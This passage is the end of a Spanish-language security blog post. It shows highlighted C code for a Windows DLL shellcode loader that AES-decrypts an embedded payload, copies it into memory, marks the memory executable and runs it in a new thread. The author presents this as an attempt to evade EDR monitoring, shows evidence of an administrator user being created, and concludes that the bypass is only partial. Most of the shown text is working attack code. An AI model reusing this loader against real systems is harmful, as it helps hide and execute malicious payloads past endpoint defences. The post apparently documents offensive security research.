    <span class="kt">void</span> <span class="o">*</span> <span class="n">exec_mem</span><span class="p">;</span>
    <span class="n">BOOL</span> <span class="n">rv</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="n">th</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">oldprotect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span>
	<span class="n">exec_mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
	<span class="n">AESDecrypt</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">key</span><span class="p">));</span>
	<span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">);</span>
	<span class="n">rv</span> <span class="o">=</span> <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldprotect</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span> <span class="n">rv</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
					<span class="n">th</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span> <span class="n">exec_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
					<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">th</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>

<span class="p">}</span>
<span class="p">}</span>

<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span>  <span class="n">DWORD</span>  <span class="n">ul_reason_for_call</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>

    <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>  <span class="p">{</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div>
<p>Y la evidencia de su ejecución:</p>

<p><img src="/assets/images/EDR_1_create_user.png" alt="EDR create Admin user" /></p>

<h1 id="conslusiones-y-siguientes-pasos">Conslusiones y siguientes pasos</h1>

<p>Podemos considerar que tenemos el bypass, bajo mi punto de vista no. SOlo podemos afirmar que es posible inyectar código y ejecutar comandos que tendrar un nuevo proceso/hilo bajo un contexto que estará auditado en el EDR.
Tiene pinta, de que será el camino junto a las DLL reflectivas.</p>

<p>Espero que os pareciera interasante.</p>

<p><a href="./">back</a></p>

      </section>
    </div>
  </body>
</html>
